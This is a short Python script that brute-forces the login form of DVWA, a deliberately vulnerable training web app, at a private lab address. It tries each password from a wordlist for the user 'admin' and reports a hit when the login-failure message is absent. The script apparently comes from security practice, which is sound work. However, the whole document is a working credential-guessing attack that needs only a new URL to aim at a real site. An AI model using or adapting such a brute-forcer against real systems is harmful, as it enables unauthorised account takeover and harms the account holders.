import requests
import sys

# the url to enter username and password
target_url = "http://10.0.2.23/dvwa/login.php"

# "username", "password" and "Login" is the name of the fields in the login form
# "Login" is the button to submit the form
website_data = {"username": "admin", "password": "", "Login": "submit"}

password_list = open("password-list.txt", "r")

# run through each password in the password file
for password in password_list:

    password = password.strip()
    website_data["password"] = password
    response = requests.post(target_url, data=website_data) # send the data to the website

    if "Login failed" not in response.text: # password found if website did not return error
        print("[+] Got the password!! --> " + password )
        sys.exit()

print("[-] Reached end of file. Password could not be found.")